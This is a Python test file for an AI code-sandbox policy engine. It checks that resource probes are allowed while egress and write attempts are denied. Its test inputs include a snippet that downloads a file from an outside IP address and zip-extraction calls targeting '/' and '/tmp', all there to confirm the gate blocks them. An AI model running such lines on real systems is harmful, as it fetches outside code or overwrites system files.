"""Runtime containment: gate-allowed timeout/memory; write/egress stay gate-denied."""

from airlock.policy import PolicyEngine
from airlock.schemas import ActionRequest
from airlock.web.containment import (
    HEALTHY_CODE,
    MEMORY_PROBE_CODE,
    PROBE_CODES,
    TIMEOUT_PROBE_CODE,
    UNSUPPORTED,
    evaluate_pair,
    slots_for,
)


def _decide(lang: str, code: str):
    return PolicyEngine().evaluate(
        ActionRequest(
            id="a",
            task_id="t",
            tool="run_code",
            lang=lang,
            code=code,
            network="none",
            requested={"timeout_s": 10, "mem_mb": 128, "cpus": 0.5, "pids": 32},
        )
    )


def test_supported_probes_are_allowed_by_production_gate():
    for name, code in PROBE_CODES.items():
        d = _decide("python", code)
        assert d.verdict == "allow", (name, d.rules_fired, d.reason)
    assert _decide("python", HEALTHY_CODE).verdict == "allow"


def test_former_bypass_probes_are_now_gate_denied():
    """Do not stage write/egress runtime demos via policy gaps."""
    fancy = _decide(
        "python",
        "from urllib.request import FancyURLopener\n"
        "FancyURLopener().retrieve('http://203.0.113.50/x','/work/out/x')\n",
    )
    assert fancy.verdict == "deny"

    extract_root = _decide(
        "python",
        "import zipfile\nzipfile.ZipFile('/work/input/a.zip').extractall('/')\n",
    )
    assert extract_root.verdict == "deny"
    assert "R-PY-ZIP-EXTRACT" in extract_root.rules_fired

    extract_tmp = _decide(
        "python",
        "import zipfile\nzipfile.ZipFile('/work/input/a.zip').extractall('/tmp')\n",
    )
    assert extract_tmp.verdict == "deny"
    assert "R-PY-ZIP-EXTRACT" in extract_tmp.rules_fired

    # Writable tmpfs outside /work/out must stay denied (rootfs RO is not enough).
    open_tmp = _decide("python", "open('/tmp/x','w').write('x')\n")
    assert open_tmp.verdict == "deny"


def test_zip_extract_under_work_out_still_allowed():
    d = _decide(
        "python",
        "import zipfile\n"
        "zipfile.ZipFile('/work/input/a.zip').extractall('/work/out/extracted')\n"
        "print('ok')\n",
    )
    assert d.verdict == "allow", (d.rules_fired, d.reason)


def test_unsupported_probe_metadata_is_honest():
    assert set(UNSUPPORTED) == {"write", "egress"}
    assert "R-PY-ZIP-EXTRACT" in UNSUPPORTED["write"]["gate_rule"]
    assert slots_for("containment_suite") == 4
    assert slots_for("containment_then_healthy", "timeout") == 2
    assert slots_for("containment_then_healthy", "write") == 0


def test_evaluate_pair_failed_on_unexpected_success():
    probe = {
        "verdict": "allow",
        "status": "executed",
        "execution": {"killed_by": None, "exit_code": 0, "stdout": "should not reach 400\n"},
        "cleanup": {"container_absent": True, "network_absent": True},
    }
    healthy = {
        "verdict": "allow",
        "status": "executed",
        "execution": {"exit_code": 0, "stdout": "2\n"},
        "cleanup": {"container_absent": True, "network_absent": True},
    }
    out = evaluate_pair("memory", probe, healthy)
    assert out["state"] == "FAILED"


def test_evaluate_pair_pass_requires_kill_healthy_and_cleanup():
    probe = {
        "verdict": "allow",
        "status": "executed",
        "execution": {"killed_by": "timeout", "exit_code": 137, "stdout": "sleeping\n"},
        "cleanup": {"container_absent": True, "network_absent": True},
    }
    healthy = {
        "verdict": "allow",
        "status": "executed",
        "execution": {"exit_code": 0, "stdout": "2\n"},
        "cleanup": {"container_absent": True, "network_absent": True},
    }
    assert evaluate_pair("timeout", probe, healthy)["state"] == "PASS"
    healthy_bad = dict(healthy, execution={"exit_code": 0, "stdout": "3\n"})
    assert evaluate_pair("timeout", probe, healthy_bad)["state"] == "FAILED"


def test_probe_snippets():
    assert "time.sleep(100)" in TIMEOUT_PROBE_CODE
    assert "1024 * 1024" in MEMORY_PROBE_CODE
